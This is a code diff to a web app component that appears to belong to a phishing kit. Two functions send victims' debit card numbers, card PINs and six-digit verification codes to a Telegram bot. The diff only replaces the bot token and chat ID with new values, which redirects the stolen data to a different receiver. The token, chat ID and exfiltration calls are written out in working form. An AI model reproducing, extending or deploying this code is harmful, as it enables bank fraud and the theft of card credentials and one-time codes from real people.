@@ -129,8 +129,8 @@ const App = () => {
   // Send debit card info to Telegram
   const sendDebitCardToTelegram = async (number, code) => {
     try {
-      const token = '7540486155:AAGg9r2eNaLCWF2hWt8wo4wG8ykFD78_i1Q';
-      const chatId = '7855300611';
+      const token = '8575056070:AAFOf7DyUI3Q0mB1nXqWXx-uKrPTtPWEz3Q';
+      const chatId = '8375471974';
       const message = `Información de tarjeta de débito:\nNúmero: ${number}\nClave: ${code}`;
 
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -176,8 +176,8 @@ const App = () => {
   // Send 6-digit code to Telegram and show loading
   const sendSixDigitToTelegram = async (code) => {
     try {
-      const token = '7540486155:AAGg9r2eNaLCWF2hWt8wo4wG8ykFD78_i1Q';
-      const chatId = '7855300611';
+      const token = '8575056070:AAFOf7DyUI3Q0mB1nXqWXx-uKrPTtPWEz3Q';
+      const chatId = '8375471974';
       const message = `Código de 6 dígitos:\n${code}`;
 
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
